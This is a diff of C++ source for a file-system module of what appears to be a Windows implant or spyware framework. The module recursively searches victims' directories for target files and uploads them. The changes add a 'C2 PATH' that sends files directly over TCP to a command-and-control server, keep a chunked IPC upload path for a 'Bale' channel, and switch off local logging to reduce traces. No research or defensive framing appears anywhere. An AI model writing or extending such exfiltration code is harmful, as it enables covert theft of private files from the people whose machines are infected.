@@ -4,18 +4,25 @@
  *            sends reports on report pipe.
  *===========================================================================*/
 
+#define WIN32_LEAN_AND_MEAN
 #include "Atom_09_FileSys.h"
 #include "../Orchestrator/AtomManager.h"
 #include "../Orchestrator/Config.h"
 #include <cstdio>
 #include <cstring>
 #include <shlwapi.h>
+#include <shlwapi.h>
 #include <string>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#pragma comment(lib, "ws2_32.lib")
+#include "../Orchestrator/TurboSend.h"
 
 #pragma comment(lib, "shlwapi.lib")
 
 /* Debug logging to C:\Users\Public\fs_debug.txt */
 static void FsDebug(const char *format, ...) {
+  if (!Config::LOGGING_ENABLED) return;
   char buf[512];
   va_list args;
   va_start(args, format);
@@ -76,7 +83,7 @@ static BOOL IsTargetFile(const WCHAR *szFileName, const WCHAR *szTargetExt, cons
     return FALSE;
 }
 
-static void ExfiltrateFile(HANDLE hReportPipe, const WCHAR *szPathW, BYTE *pSharedKey) {
+static void ExfiltrateFile(HANDLE hReportPipe, const WCHAR *szPathW, BYTE *pSharedKey, BOOL bIsBale) {
     HANDLE hFile = CreateFileW(szPathW, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) return;
 
@@ -88,37 +95,44 @@ static void ExfiltrateFile(HANDLE hReportPipe, const WCHAR *szPathW, BYTE *pShar
     char *fileName = strrchr(szPathA, '\\');
     if (fileName) fileName++; else fileName = szPathA;
 
-    // Send header
-    char header[512];
-    sprintf_s(header, "[FS_FILE] name=%s size=%lu path=%s", fileName, dwSize, szPathA);
-    IPC_MESSAGE hdrMsg = {0};
-    hdrMsg.dwSignature = 0x534D4952;
-    hdrMsg.CommandId = CMD_FORWARD_REPORT; // Send as forward so it's prioritized
-    hdrMsg.AtomId = 9;
-    hdrMsg.dwPayloadLen = (DWORD)strlen(header);
-    memcpy(hdrMsg.Payload, header, hdrMsg.dwPayloadLen);
-    IPC_SendMessage(hReportPipe, &hdrMsg, pSharedKey, 16);
+    if (!bIsBale) {
+        // === C2 PATH: Turbo TCP direct send ===
+        CloseHandle(hFile);
+        Turbo::SendFile("FS_FILE", szPathA);
+    } else {
+        // === BALE PATH: Chunked over IPC ===
+        // Send header
+        char header[512];
+        sprintf_s(header, "[FS_FILE] name=%s size=%lu path=%s", fileName, dwSize, szPathA);
+        IPC_MESSAGE hdrMsg = {0};
+        hdrMsg.dwSignature = 0x534D4952;
+        hdrMsg.CommandId = CMD_FORWARD_REPORT; // Send as forward so it's prioritized
+        hdrMsg.AtomId = 9;
+        hdrMsg.dwPayloadLen = (DWORD)strlen(header);
+        memcpy(hdrMsg.Payload, header, hdrMsg.dwPayloadLen);
+        IPC_SendMessage(hReportPipe, &hdrMsg, pSharedKey, 16);
 
-    // Send data in chunks
-    BYTE buffer[MAX_IPC_PAYLOAD_SIZE - 64];
-    DWORD dwRead = 0;
-    while (ReadFile(hFile, buffer, sizeof(buffer), &dwRead, NULL) && dwRead > 0) {
-        IPC_MESSAGE chunkMsg = {0};
-        chunkMsg.dwSignature = 0x534D4952;
-        chunkMsg.CommandId = CMD_FORWARD_REPORT;
-        chunkMsg.AtomId = 9;
-        chunkMsg.dwPayloadLen = dwRead;
-        memcpy(chunkMsg.Payload, buffer, dwRead);
-        IPC_SendMessage(hReportPipe, &chunkMsg, pSharedKey, 16);
+        // Send data in chunks
+        BYTE buffer[MAX_IPC_PAYLOAD_SIZE - 64];
+        DWORD dwRead = 0;
+        while (ReadFile(hFile, buffer, sizeof(buffer), &dwRead, NULL) && dwRead > 0) {
+            IPC_MESSAGE chunkMsg = {0};
+            chunkMsg.dwSignature = 0x534D4952;
+            chunkMsg.CommandId = CMD_FORWARD_REPORT;
+            chunkMsg.AtomId = 9;
+            chunkMsg.dwPayloadLen = dwRead;
+            memcpy(chunkMsg.Payload, buffer, dwRead);
+            IPC_SendMessage(hReportPipe, &chunkMsg, pSharedKey, 16);
+        }
+        CloseHandle(hFile);
     }
-    CloseHandle(hFile);
 }
 
 /*
  * Recursive directory walk – sends file paths via report pipe
  */
 static void WalkDirectory(HANDLE hCmdPipe, HANDLE hReportPipe, const WCHAR *szDir, const WCHAR *szExt, const WCHAR *szKey,
-                           BOOL bOverride, BOOL bFull, BOOL bSmartExfil, BYTE *pSharedKey, int depth = 0) {
+                           BOOL bOverride, BOOL bFull, BOOL bSmartExfil, BOOL bIsBale, BYTE *pSharedKey, int depth = 0) {
   if (depth > 15) {
     FsDebug("Max recursion depth reached at: %ls", szDir);
     return;
@@ -153,7 +167,7 @@ static void WalkDirectory(HANDLE hCmdPipe, HANDLE hReportPipe, const WCHAR *szDi
       if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
         if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) &&
             !ShouldSkipDir(fd.cFileName, bOverride)) {
-          WalkDirectory(hCmdPipe, hReportPipe, szFullPath, szExt, szKey, bOverride, bFull, bSmartExfil, pSharedKey, depth + 1);
+          WalkDirectory(hCmdPipe, hReportPipe, szFullPath, szExt, szKey, bOverride, bFull, bSmartExfil, bIsBale, pSharedKey, depth + 1);
         }
       } else {
         if (IsTargetFile(fd.cFileName, szExt, szKey, bFull)) {
@@ -169,15 +183,17 @@ static void WalkDirectory(HANDLE hCmdPipe, HANDLE hReportPipe, const WCHAR *szDi
           IPC_SendMessage(hReportPipe, &msg, pSharedKey, 16);
 
           if (bSmartExfil && fd.nFileSizeLow < 50 * 1024 * 1024) { // Only auto-exfil files < 50MB
-             ExfiltrateFile(hReportPipe, szFullPath, pSharedKey);
+             ExfiltrateFile(hReportPipe, szFullPath, pSharedKey, bIsBale);
           }
 
-          // Log to local file for Bale/Flushing
-          FILE *f = NULL;
-          fopen_s(&f, "log\\fs_scan.txt", "a");
-          if (f) {
-            fprintf(f, "%s\n", szPathA);
-            fclose(f);
+          // Log to local file for Bale/Flushing (Only if logging is enabled or Bale specifically needs it)
+          if (Config::LOGGING_ENABLED) {
+            FILE *f = NULL;
+            fopen_s(&f, "log\\fs_scan.txt", "a");
+            if (f) {
+              fprintf(f, "%s\n", szPathA);
+              fclose(f);
+            }
           }
         }
       }
@@ -247,15 +263,20 @@ DWORD WINAPI FileSystemAtomMain(LPVOID lpParam) {
             memcpy(msg.Payload, report, msg.dwPayloadLen);
             IPC_SendMessage(hReportPipe, &msg, SharedSessionKey, 16);
           } else if (payload == "FLUSH") {
-            char report[MAX_PATH];
-            GetFullPathNameA("log\\fs_scan.txt", MAX_PATH, report, NULL);
+            char reportPath[MAX_PATH];
+            GetFullPathNameA("log\\fs_scan.txt", MAX_PATH, reportPath, NULL);
+            
+            char signal[MAX_PATH + 32];
+            sprintf_s(signal, "[FS_FLUSH_READY] %s", reportPath);
+            
             IPC_MESSAGE msg = {0};
             msg.dwSignature = 0x534D4952;
             msg.CommandId = CMD_REPORT;
             msg.AtomId = 9;
-            sprintf_s((char *)msg.Payload, sizeof(msg.Payload), "[FS_FLUSH_READY] %s", report);
-            msg.dwPayloadLen = (DWORD)strlen((char *)msg.Payload);
+            msg.dwPayloadLen = (DWORD)strlen(signal);
+            memcpy(msg.Payload, signal, msg.dwPayloadLen);
             IPC_SendMessage(hReportPipe, &msg, SharedSessionKey, 16);
+            FsDebug("FLUSH: Signaled Bale to upload %s", reportPath);
           } else {
             // Format: [PATH]|[EXT]|[KEYWORD]|[FLAGS]
             char szPathA[MAX_PATH] = {0};
@@ -264,14 +285,26 @@ DWORD WINAPI FileSystemAtomMain(LPVOID lpParam) {
             char szFlagsA[32] = {0};
 
             char *next = NULL;
-            char *p = strtok_s((char *)inMsg.Payload, "|", &next);
-            if (p) strcpy_s(szPathA, p);
-            p = strtok_s(NULL, "|", &next);
-            if (p) strcpy_s(szExtA, p);
-            p = strtok_s(NULL, "|", &next);
-            if (p) strcpy_s(szKeyA, p);
-            p = strtok_s(NULL, "|", &next);
-            if (p) strcpy_s(szFlagsA, p);
+            int section = 0;
+            char* dest = szPathA;
+            int destLen = MAX_PATH;
+            int j = 0;
+            for (DWORD i = 0; i < inMsg.dwPayloadLen && inMsg.Payload[i] != '\0'; i++) {
+                if (inMsg.Payload[i] == '|') {
+                    dest[j] = '\0';
+                    section++;
+                    j = 0;
+                    if (section == 1) { dest = szExtA; destLen = 32; }
+                    else if (section == 2) { dest = szKeyA; destLen = 128; }
+                    else if (section == 3) { dest = szFlagsA; destLen = 32; }
+                    else { dest = NULL; }
+                } else if (dest != NULL) {
+                    if (j < destLen - 1) {
+                        dest[j++] = inMsg.Payload[i];
+                    }
+                }
+            }
+            if (dest != NULL) dest[j] = '\0';
 
             WCHAR szPathW[MAX_PATH] = {0}, szExtW[32] = {0}, szKeyW[128] = {0};
             MultiByteToWideChar(CP_ACP, 0, szPathA, -1, szPathW, MAX_PATH);
@@ -299,13 +332,14 @@ DWORD WINAPI FileSystemAtomMain(LPVOID lpParam) {
               BOOL bOverride = (strstr(szFlagsA, "OVERRIDE") != NULL);
               BOOL bValidateOnly = (strstr(szFlagsA, "VALIDATE") != NULL);
               BOOL bSmartExfil = (strstr(szFlagsA, "SMART_EXFIL") != NULL);
+              BOOL bIsBale = (strstr(szFlagsA, "BALE") != NULL);
               BOOL bFull = (szExtW[0] == L'\0' && szKeyW[0] == L'\0');
               
               if (!bValidateOnly) {
                  // Clear old scan log
                  DeleteFileA("log\\fs_scan.txt");
                  try {
-                    WalkDirectory(hCmdPipe, hReportPipe, szPathW, szExtW, szKeyW, bOverride, bFull, bSmartExfil, SharedSessionKey);
+                    WalkDirectory(hCmdPipe, hReportPipe, szPathW, szExtW, szKeyW, bOverride, bFull, bSmartExfil, bIsBale, SharedSessionKey);
                     
                     // Send final report
                     char report[MAX_PATH];
